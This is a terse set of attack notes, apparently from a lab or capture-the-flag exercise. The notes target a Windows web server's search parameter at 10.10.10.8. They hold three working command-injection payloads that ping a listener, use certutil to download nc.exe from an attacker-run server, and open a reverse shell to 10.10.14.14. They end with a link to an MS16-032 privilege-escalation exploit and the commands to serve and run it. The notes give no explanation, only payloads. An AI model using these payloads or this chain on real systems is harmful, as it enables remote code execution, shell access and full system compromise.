```
http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+-n+1+10.10.14.14.}

http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+certutil+-urlcache+-f+http://10.10.14.14:8000/nc.exe+nc.exe.}

http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+nc.exe+10.10.14.14+4567+-e+cmd.}

#use + to replace spaces

https://github.com/khr0x40sh/ms16-032/blob/master/x64/ms16-032.exe

python3 -m http.server
ms16-032.exe


```
